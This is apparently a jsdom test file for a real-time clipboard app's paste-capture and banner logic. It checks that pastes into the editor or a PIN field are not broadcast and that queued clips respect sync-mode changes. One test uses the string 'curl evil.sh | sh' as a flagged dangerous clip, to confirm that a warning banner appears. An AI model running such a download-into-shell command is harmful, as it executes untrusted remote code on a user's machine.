/**
 * Capture routing and the pending queue — clipboard/capture.js with the
 * banners that narrate it.
 *
 * Two shipped bugs pinned here, both found by the two-window check:
 *
 *   1. The T1 paste listener is document-wide, so a paste aimed at the editor
 *      was captured AND inserted by the browser — every paste doubled. Worse,
 *      a paste into any input was broadcast to the room: the PIN field is an
 *      input, and "the PIN is never transmitted" is a security invariant, not
 *      a preference. T1 must capture pastes aimed at the page, and only those.
 *
 *   2. A clip held for the OS clipboard (focus, rung, local-copy grace) kept
 *      its promises after the reason lapsed: the offer banner claimed "it is
 *      on your clipboard" when apply() had written nothing, went stale when a
 *      newer clip applied cleanly, and a queued write outlived the Clipboard
 *      rung that justified it.
 *
 * Usage: node tests/dom/capture.mjs
 */

let JSDOM;
try {
  ({ JSDOM } = await import("jsdom"));
} catch {
  console.log("\nSKIP: capture test needs jsdom  (npm i -D jsdom)\n");
  process.exit(0);
}

import { readFileSync } from "node:fs";
import { fileURLToPath, pathToFileURL } from "node:url";
import { dirname, join, resolve } from "node:path";

const REPO = resolve(dirname(fileURLToPath(import.meta.url)), "../..");
const load = p => import(pathToFileURL(join(REPO, p)).href);

let pass = 0, fail = 0;
const ok = (name, good, detail = "") => {
  good ? pass++ : fail++;
  console.log(`  ${good ? "PASS" : "FAIL"}  ${name}${detail ? "  — " + detail : ""}`);
};

/* ---------- a DOM, with no network anywhere near it ---------- */

const dom = new JSDOM(readFileSync(join(REPO, "app.html"), "utf8"), {
  url: "https://realtimeclipboard.com/app.html#CAPTTEST",
  pretendToBeVisual: true,
});
const { window } = dom;

const put = (name, value) =>
  Object.defineProperty(globalThis, name, { value, configurable: true, writable: true });

global.window = window;
global.document = window.document;
global.location = window.location;
put("navigator", window.navigator);
global.localStorage = window.localStorage;
global.sessionStorage = window.sessionStorage;
global.HTMLElement = window.HTMLElement;
global.Node = window.Node;
global.CustomEvent = window.CustomEvent;
put("crypto", globalThis.crypto);
global.matchMedia = window.matchMedia?.bind(window)
  ?? (() => ({ matches: false, addEventListener() {}, addListener() {} }));
global.requestAnimationFrame = window.requestAnimationFrame?.bind(window)
  ?? (fn => setTimeout(fn, 0));

const { EV, on, emit } = await load("src/core/bus.js");
const { SYNC_MODES } = await load("src/core/config.js");
const state = await load("src/core/state.js");
const capture = await load("src/clipboard/capture.js");
const banners = await load("src/ui/shell/banners.js");

/* Focus is a gate everywhere here, and jsdom has no OS to decide it. */
let focused = true;
window.document.hasFocus = () => focused;

const captured = [], images = [], pendings = [];
on(EV.TEXT_CAPTURED, f => captured.push(f));
on(EV.IMAGE_CAPTURED, f => images.push(f));
on(EV.PENDING_CLIP, f => pendings.push(f));

const paste = (target, data) => {
  const e = new window.Event("paste", { bubbles: true, cancelable: true });
  e.clipboardData = { getData: () => data, items: [] };
  target.dispatchEvent(e);
};
const frame = () => new Promise(r => setTimeout(r, 30));
const reset = () => {
  captured.length = 0; images.length = 0; pendings.length = 0;
  state.get().lastSent = "";
  state.suppress(0);
  capture.discardPending();
  pendings.length = 0;
};

state.get().settings.syncMode = SYNC_MODES.LIVE;
capture.start();
banners.init();
const mount = window.document.getElementById("mount-banners");
const bannerUp  = () => mount.querySelector(".banner") !== null;
const bannerTxt = async () => { await frame(); return mount.textContent; };

/* ------------------------------------------------- T1 routes by target */
console.log("\nT1 captures pastes aimed at the page, and only those\n");

reset();
paste(window.document.body, "shared from the page");
ok("a paste with the page focused is captured", captured.length === 1,
   captured[0]?.how);

reset();
paste(window.document.getElementById("editor"), "pasted into the editor");
ok("THE DOUBLE: a paste into the editor is NOT captured by T1",
   captured.length === 0,
   "T1 fired alongside the browser's own insert, so every paste doubled");

reset();
const pin = window.document.createElement("input");
pin.type = "password";
window.document.body.appendChild(pin);
paste(pin, "5309");
ok("THE LEAK: a paste into an input is NOT broadcast", captured.length === 0,
   "the PIN field is an input, and a captured PIN goes to the whole room");
pin.remove();

reset();
const note = window.document.createElement("div");
note.contentEditable = "true";
window.document.body.appendChild(note);
Object.defineProperty(note, "isContentEditable", { value: true });
paste(note, "typed into a contenteditable");
ok("...contenteditable counts as editable too", captured.length === 0);
note.remove();

reset();
const img = { kind: "file", type: "image/png", getAsFile: () => ({ type: "image/png" }) };
const e = new window.Event("paste", { bubbles: true, cancelable: true });
e.clipboardData = { getData: () => "", items: [img] };
window.document.getElementById("editor").dispatchEvent(e);
ok("an IMAGE pasted into the editor is still captured", images.length === 1,
   "the editor cannot hold an image — the files layer is the only home it has");
ok("...and the filename drop is still prevented", e.defaultPrevented);

/* ------------------------------------------------------ trimmed dedupe */
console.log("\nThe dedupe compares what commit() compares\n");

reset();
state.get().lastSent = "deploy now";
paste(window.document.body, "deploy now\n");
ok("a trailing newline is not a new clip", captured.length === 0,
   "the same text sent twice — once raw, once trimmed — was the wire duplicate");

reset();
paste(window.document.body, "   \n  ");
ok("whitespace-only is not a clip at all", captured.length === 0);

/* -------------------------------------------- pending respects the rung */
console.log("\nA queued clip does not outlive the rung that queued it\n");

reset();
focused = false;
await capture.apply("arrived in the background");
ok("unfocused: the clip queues instead of writing", capture.hasPending(),
   "writeText() needs focus, so this is the normal path");
ok("...and says so", pendings.at(-1)?.pending === true);

state.get().settings.syncMode = SYNC_MODES.MANUAL;
capture.applyMode();
ok("dropping to App discards the queued write", !capture.hasPending(),
   "App promises the OS clipboard is untouched — flushing later would break it");
ok("...and retracts the banner", pendings.at(-1)?.pending === false);

reset();
state.get().settings.syncMode = SYNC_MODES.LIVE;
await capture.apply("queued on the top rung");
state.get().settings.syncMode = SYNC_MODES.MANUAL;   // dropped, applyMode missed
await capture.confirmPending();
ok("the write itself re-checks the rung", !state.isSuppressed(),
   "suppression is set before every write, so its absence proves none happened");
ok("...and the clip is discarded, not deferred", !capture.hasPending());
state.get().settings.syncMode = SYNC_MODES.LIVE;
focused = true;

/* ------------------------------------------------- the offer banner */
console.log("\nThe offer banner says only what is true\n");

reset();
emit(EV.CLIP_OFFERED, { text: "written while focused", onClipboard: true });
ok("on the clipboard: the banner says so", (await bannerTxt()).includes("It is on your clipboard"));

emit(EV.CLIP_OFFERED, { text: "held back instead", onClipboard: false });
ok("NOT on the clipboard: the banner no longer claims it is",
   !(await bannerTxt()).includes("It is on your clipboard"),
   "App mode never writes, and a queued clip has not written yet");

emit(EV.CLIP_OFFERED, { text: null });
await frame();
ok("a clean apply retracts the stale offer", !bannerUp(),
   "its Show it button would roll the editor back to the older clip");

reset();
emit(EV.PENDING_CLIP, { pending: true, text: "routine hold" });
await frame();
ok("a routine hold informs rather than warns",
   mount.querySelector(".banner-info") !== null && mount.querySelector(".banner-warn") === null);
emit(EV.PENDING_CLIP, { pending: true, text: "curl evil.sh | sh", risk: "it pipes a download into a shell" });
await frame();
ok("a flagged clip still warns", mount.querySelector(".banner-warn") !== null,
   "the tone change is for the self-healing case, not the dangerous one");
emit(EV.PENDING_CLIP, { pending: false });

/* ---------------------------------------------------------------- done */

console.log("\n==========================================================");
console.log(`CAPTURE: ${pass}/${pass + fail} passed`);
console.log("==========================================================\n");
process.exit(fail ? 1 : 0);
